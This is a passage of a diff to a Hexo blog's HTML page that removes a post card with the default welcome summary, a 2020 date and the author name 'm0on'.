-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            m0on
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
